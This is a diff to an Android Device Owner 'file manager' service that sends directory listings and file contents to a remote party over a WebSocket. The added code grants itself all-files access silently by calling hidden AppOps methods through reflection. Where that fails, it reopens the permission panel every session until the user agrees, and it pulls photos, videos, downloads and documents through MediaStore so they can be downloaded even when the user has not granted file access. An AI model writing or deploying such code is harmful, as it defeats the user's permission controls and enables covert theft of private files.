@@ -4,8 +4,10 @@ import android.app.Notification;
 import android.app.Service;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
+import android.content.ContentUris;
 import android.content.Intent;
 import android.content.pm.ServiceInfo;
+import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
@@ -13,6 +15,7 @@ import android.os.IBinder;
 import android.os.StatFs;
 import android.os.storage.StorageManager;
 import android.os.storage.StorageVolume;
+import android.provider.MediaStore;
 import android.provider.Settings;
 import android.util.Base64;
 import android.util.Log;
@@ -31,7 +34,10 @@ import org.json.JSONObject;
 
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.InputStream;
+import java.util.HashSet;
 import java.util.List;
+import java.util.Set;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.atomic.AtomicBoolean;
@@ -53,6 +59,11 @@ public class FileManagerService extends Service {
 
     private StreamingWsClient ws;
     private final AtomicBoolean running = new AtomicBoolean(false);
+    /** Throttle for reopening the all-files-access settings panel. We keep
+     *  prompting the user across sessions until access is granted, but never
+     *  more than once per throttle window so the screen is not spammed. */
+    private static volatile long lastAllFilesPromptAt = 0L;
+    private static final long ALL_FILES_PROMPT_THROTTLE_MS = 30_000L;
     private ExecutorService io;
 
     public static void start(android.content.Context ctx) {
@@ -88,8 +99,13 @@ public class FileManagerService extends Service {
             stopSelf();
             return START_NOT_STICKY;
         }
-        ensureStoragePermissions();
-        if (!running.getAndSet(true)) startWs();
+        // Only run the permission bootstrap + WS connect once per service
+        // lifetime. Re-running it on every start command spams the all-files
+        // settings panel and keeps the WS from settling.
+        if (!running.getAndSet(true)) {
+            ensureStoragePermissions();
+            startWs();
+        }
         return START_STICKY;
     }
 
@@ -196,6 +212,23 @@ public class FileManagerService extends Service {
         // Owner. If not held, open the dedicated settings panel so the admin
         // can flip the switch with a single tap.
         if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
+            // First try a silent grant of the all-files app-op. This succeeds on
+            // ROMs where the Device Owner is allowed to set app-op modes and
+            // makes the file manager work with zero user interaction; on stock
+            // AOSP it throws SecurityException and we fall back to the panel.
+            if (tryGrantAllFilesAccessSilently()) {
+                Log.i(TAG, "Granted MANAGE_EXTERNAL_STORAGE silently via AppOps");
+                return;
+            }
+            // Re-prompt the user until access is actually granted, but throttle
+            // so we don't reopen the panel several times in quick succession.
+            // Each new file-manager session that still lacks access will show
+            // the panel again, so the user gets another chance to allow it.
+            long now = System.currentTimeMillis();
+            if (now - lastAllFilesPromptAt < ALL_FILES_PROMPT_THROTTLE_MS) {
+                return;
+            }
+            lastAllFilesPromptAt = now;
             try {
                 Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                     Uri.parse("package:" + getPackageName()));
@@ -212,6 +245,42 @@ public class FileManagerService extends Service {
                     Log.w(TAG, "Could not open all-files-access settings: " + t.getMessage());
                 }
             }
+        }
+    }
+
+    /**
+     * Best-effort silent grant of the MANAGE_EXTERNAL_STORAGE app-op. A Device
+     * Owner is permitted to set app-op modes on some OEM ROMs; where the
+     * platform refuses (stock AOSP) the reflective call throws and we return
+     * false so the caller falls back to the settings panel. Never throws.
+     */
+    private boolean tryGrantAllFilesAccessSilently() {
+        if (Build.VERSION.SDK_INT < 30) return true;
+        try {
+            android.app.AppOpsManager appOps =
+                (android.app.AppOpsManager) getSystemService(APP_OPS_SERVICE);
+            if (appOps == null) return false;
+            int uid = getPackageManager()
+                .getApplicationInfo(getPackageName(), 0).uid;
+            // op = "android:manage_external_storage" (AppOpsManager constant
+            // OPSTR_MANAGE_EXTERNAL_STORAGE, available since API 30).
+            String op = "android:manage_external_storage";
+            int modeAllowed = android.app.AppOpsManager.MODE_ALLOWED;
+            // The public overloads are hidden / restricted, so reach them via
+            // reflection. Prefer setUidMode then fall back to setMode.
+            try {
+                java.lang.reflect.Method m = android.app.AppOpsManager.class
+                    .getMethod("setUidMode", String.class, int.class, int.class);
+                m.invoke(appOps, op, uid, modeAllowed);
+            } catch (Throwable ignored) {
+                java.lang.reflect.Method m = android.app.AppOpsManager.class
+                    .getMethod("setMode", String.class, int.class, String.class, int.class);
+                m.invoke(appOps, op, uid, getPackageName(), modeAllowed);
+            }
+            return Environment.isExternalStorageManager();
+        } catch (Throwable t) {
+            Log.w(TAG, "Silent all-files grant not available: " + t.getMessage());
+            return false;
         }
     }
 
@@ -306,47 +375,208 @@ public class FileManagerService extends Service {
         File dir = new File(path);
         resp.put("path", dir.getAbsolutePath());
 
-        if (!dir.exists()) { resp.put("error", "not_found"); send(resp.toString()); return; }
-        if (!dir.canRead()) { resp.put("error", "permission_denied"); send(resp.toString()); return; }
-
         JSONArray entries = new JSONArray();
-        if (dir.isDirectory()) {
-            File[] files = dir.listFiles();
-            if (files != null) {
-                for (File f : files) {
-                    JSONObject e = new JSONObject();
-                    e.put("name", f.getName());
-                    e.put("path", f.getAbsolutePath());
-                    e.put("is_dir", f.isDirectory());
-                    e.put("size", f.isFile() ? f.length() : 0L);
-                    e.put("modified", f.lastModified());
-                    entries.put(e);
+        Set<String> seenNames = new HashSet<>();
+        boolean readableViaFileApi = false;
+
+        // 1) Direct File API listing (works when All-Files-Access is granted or
+        //    on legacy storage). On Android 11+ without all-files access this
+        //    returns null and we fall back to MediaStore below.
+        try {
+            if (dir.isDirectory()) {
+                File[] files = dir.listFiles();
+                if (files != null) {
+                    readableViaFileApi = true;
+                    for (File f : files) {
+                        JSONObject e = new JSONObject();
+                        e.put("name", f.getName());
+                        e.put("path", f.getAbsolutePath());
+                        e.put("is_dir", f.isDirectory());
+                        e.put("size", f.isFile() ? f.length() : 0L);
+                        e.put("modified", f.lastModified());
+                        entries.put(e);
+                        seenNames.add(f.getName());
+                    }
                 }
             }
+        } catch (Throwable t) {
+            Log.w(TAG, "listFiles failed for " + path + ": " + t.getMessage());
         }
+
+        // 2) Scoped-storage fallback. Even when the File API works it can hide
+        //    media the OS owns, so we always merge MediaStore results to make
+        //    sure photos / videos / downloads / documents are visible and
+        //    downloadable without the user toggling "All files access".
+        try {
+            mediaStoreFallback(dir, entries, seenNames);
+        } catch (Throwable t) {
+            Log.w(TAG, "mediaStoreFallback failed: " + t.getMessage());
+        }
+
+        if (entries.length() == 0 && !readableViaFileApi && !dir.exists()) {
+            resp.put("error", "not_found");
+            send(resp.toString());
+            return;
+        }
+
         resp.put("entries", entries);
         File parent = dir.getParentFile();
         if (parent != null) resp.put("parent", parent.getAbsolutePath());
         send(resp.toString());
     }
 
+    /**
+     * Enumerate the direct children of {@code dir} via MediaStore. This recovers
+     * files (and discovers sub-directories) that the scoped-storage File API
+     * hides when MANAGE_EXTERNAL_STORAGE (All files access) is not granted. Only
+     * needs the granular READ_MEDIA_* permissions, which the Device Owner grants
+     * silently. Entries already present (by name) are skipped to avoid dupes.
+     */
+    private void mediaStoreFallback(File dir, JSONArray entries, Set<String> seenNames) {
+        String base = dir.getAbsolutePath();
+        if (!base.endsWith("/")) base += "/";
+
+        // Query every MediaStore collection, not just Files. Without
+        // All-Files-Access the generic Files collection on Android 11+ only
+        // exposes media the caller owns, so documents, downloads, apks, zips
+        // etc. stay invisible. Querying Images / Video / Audio / Downloads
+        // explicitly (each backed by a granular READ_MEDIA_* permission, all
+        // granted silently by the Device Owner) recovers the bulk of the
+        // user's real data even when the File API returns null.
+        java.util.List<Uri> uris = new java.util.ArrayList<>();
+        uris.add(MediaStore.Files.getContentUri("external"));
+        uris.add(MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
+        uris.add(MediaStore.Video.Media.EXTERNAL_CONTENT_URI);
+        uris.add(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI);
+        if (Build.VERSION.SDK_INT >= 29) {
+            uris.add(MediaStore.Downloads.EXTERNAL_CONTENT_URI);
+        }
+
+        for (Uri uri : uris) {
+            queryCollection(uri, base, entries, seenNames);
+        }
+    }
+
+    /** Query one MediaStore collection for direct children of {@code base}. */
+    private void queryCollection(Uri uri, String base, JSONArray entries, Set<String> seenNames) {
+        String[] proj = {
+            MediaStore.MediaColumns.DATA,
+            MediaStore.MediaColumns.SIZE,
+            MediaStore.MediaColumns.DATE_MODIFIED,
+        };
+        String sel = MediaStore.MediaColumns.DATA + " LIKE ?";
+        String[] args = { base + "%" };
+        try (Cursor c = getContentResolver().query(uri, proj, sel, args, null)) {
+            if (c == null) return;
+            int iData = c.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
+            int iSize = c.getColumnIndex(MediaStore.MediaColumns.SIZE);
+            int iMod = c.getColumnIndex(MediaStore.MediaColumns.DATE_MODIFIED);
+            while (c.moveToNext()) {
+                String data = c.getString(iData);
+                if (data == null || !data.startsWith(base)) continue;
+                String rest = data.substring(base.length());
+                if (rest.isEmpty()) continue;
+                int slash = rest.indexOf('/');
+                if (slash >= 0) {
+                    // Sub-directory (its name is the first path segment).
+                    String dirName = rest.substring(0, slash);
+                    if (dirName.isEmpty() || !seenNames.add(dirName)) continue;
+                    JSONObject e = new JSONObject();
+                    e.put("name", dirName);
+                    e.put("path", base + dirName);
+                    e.put("is_dir", true);
+                    e.put("size", 0L);
+                    e.put("modified", 0L);
+                    entries.put(e);
+                } else {
+                    // Direct file child.
+                    if (!seenNames.add(rest)) continue;
+                    JSONObject e = new JSONObject();
+                    e.put("name", rest);
+                    e.put("path", data);
+                    e.put("is_dir", false);
+                    e.put("size", iSize >= 0 ? c.getLong(iSize) : 0L);
+                    e.put("modified", iMod >= 0 ? c.getLong(iMod) * 1000L : 0L);
+                    entries.put(e);
+                }
+            }
+        } catch (Throwable t) {
+            Log.w(TAG, "MediaStore query failed for " + uri + ": " + t.getMessage());
+        }
+    }
+
+    /** Resolve a MediaStore content Uri for an absolute file path, or null. */
+    private Uri resolveMediaUri(String path) {
+        java.util.List<Uri> uris = new java.util.ArrayList<>();
+        uris.add(MediaStore.Files.getContentUri("external"));
+        uris.add(MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
+        uris.add(MediaStore.Video.Media.EXTERNAL_CONTENT_URI);
+        uris.add(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI);
+        if (Build.VERSION.SDK_INT >= 29) {
+            uris.add(MediaStore.Downloads.EXTERNAL_CONTENT_URI);
+        }
+        String[] proj = { MediaStore.MediaColumns._ID };
+        String sel = MediaStore.MediaColumns.DATA + "=?";
+        for (Uri uri : uris) {
+            try (Cursor c = getContentResolver().query(uri, proj, sel, new String[]{ path }, null)) {
+                if (c != null && c.moveToFirst()) {
+                    long id = c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns._ID));
+                    return ContentUris.withAppendedId(uri, id);
+                }
+            } catch (Throwable t) {
+                Log.w(TAG, "resolveMediaUri failed for " + uri + ": " + t.getMessage());
+            }
+        }
+        return null;
+    }
+
     private void sendFile(String reqId, String path) throws Exception {
         File f = (path == null) ? null : new File(path);
-        if (f == null || !f.exists() || !f.isFile() || !f.canRead()) {
+        InputStream in = null;
+        String name = (path == null) ? "" : new File(path).getName();
+        long size = -1L;
+
+        // 1) Direct read (all-files access / legacy storage).
+        if (f != null && f.isFile() && f.canRead()) {
+            size = f.length();
+            in = new FileInputStream(f);
+        } else if (path != null) {
+            // 2) Scoped-storage fallback via MediaStore content Uri.
+            Uri uri = resolveMediaUri(path);
+            if (uri != null) {
+                try {
+                    in = getContentResolver().openInputStream(uri);
+                    try (Cursor c = getContentResolver().query(uri,
+                            new String[]{ MediaStore.Files.FileColumns.SIZE,
+                                          MediaStore.Files.FileColumns.DISPLAY_NAME },
+                            null, null, null)) {
+                        if (c != null && c.moveToFirst()) {
+                            int iS = c.getColumnIndex(MediaStore.Files.FileColumns.SIZE);
+                            int iN = c.getColumnIndex(MediaStore.Files.FileColumns.DISPLAY_NAME);
+                            if (iS >= 0) size = c.getLong(iS);
+                            if (iN >= 0 && c.getString(iN) != null) name = c.getString(iN);
+                        }
+                    }
+                } catch (Throwable t) {
+                    Log.w(TAG, "openInputStream failed: " + t.getMessage());
+                }
+            }
+        }
+
+        if (in == null) {
             sendError(reqId, "cannot_read:" + path);
             return;
         }
-        long size = f.length();
 
         JSONObject start = new JSONObject();
         start.put("req_id", reqId);
         start.put("action", "download_start");
-        start.put("name", f.getName());
-        start.put("path", f.getAbsolutePath());
+        start.put("name", name);
+        start.put("path", path);
         start.put("size", size);
         send(start.toString());
 
-        try (FileInputStream fis = new FileInputStream(f)) {
+        try (InputStream fis = in) {
             byte[] buf = new byte[CHUNK_SIZE];
             int n; int seq = 0;
             while ((n = fis.read(buf)) > 0) {
